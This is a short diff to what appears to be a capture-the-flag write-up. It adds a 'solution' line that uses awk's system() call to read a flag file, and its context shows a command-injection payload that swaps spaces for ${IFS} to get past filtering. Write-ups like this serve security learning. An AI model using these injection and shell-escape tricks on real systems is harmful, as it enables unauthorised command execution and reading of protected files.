@@ -47,6 +47,13 @@ cat${IFS}/flag
 
 ![](https://i.imgur.com/MjDD8Wj.png)
 
+解法:
+
+```
+/usr/bin/awk BEGIN{system("cat /home/chal/flag")}
+```
+
+
 ## Web
 
 ### Share
